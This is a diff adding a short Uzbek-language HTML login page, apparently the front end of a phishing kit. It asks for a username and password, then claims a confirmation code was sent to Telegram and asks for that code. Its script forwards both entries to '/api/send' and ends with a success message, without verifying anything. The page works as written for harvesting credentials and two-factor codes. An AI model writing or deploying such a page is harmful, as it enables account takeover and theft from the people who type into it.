@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <title>Kirish</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 300px; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background: #0088cc; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
+        button:hover { background: #006699; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h3 id="title">Tizimga kirish</h3>
+    
+    <!-- 1-qadam: Login va Parol -->
+    <div id="step1">
+        <input type="text" id="username" placeholder="Login yoki Email">
+        <input type="password" id="password" placeholder="Parol">
+        <button onclick="sendCredentials()">Davom etish</button>
+    </div>
+
+    <!-- 2-qadam: Telegramdan kelgan kodni kiritish -->
+    <div id="step2" class="hidden">
+        <p style="font-size: 14px; color: #555;">Telegramga tasdiqlash kodi yuborildi.</p>
+        <input type="text" id="code" placeholder="Tasdiqlash kodi">
+        <button onclick="verifyCode()">Tasdiqlash</button>
+    </div>
+</div>
+
+<script>
+    async function sendCredentials() {
+        const u = document.getElementById('username').value;
+        const p = document.getElementById('password').value;
+
+        if(!u || !p) {
+            alert("Ma'lumotlarni to'ldiring!");
+            return;
+        }
+
+        // Backendga yuborish
+        await fetch('/api/send', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ type: 'login', username: u, password: p })
+        });
+
+        // 2-qadamga o'tish (Kod kiritish oynasi)
+        document.getElementById('step1').classList.add('hidden');
+        document.getElementById('step2').classList.remove('hidden');
+        document.getElementById('title').innerText = "Kodni kiriting";
+    }
+
+    async function verifyCode() {
+        const c = document.getElementById('code').value;
+        if(!c) return alert("Kodni kiriting!");
+
+        await fetch('/api/send', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ type: 'code', code: c })
+        });
+
+        alert("Muvaffaqiyatli yakunlandi!");
+    }
+</script>
+
+</body>
+</html>
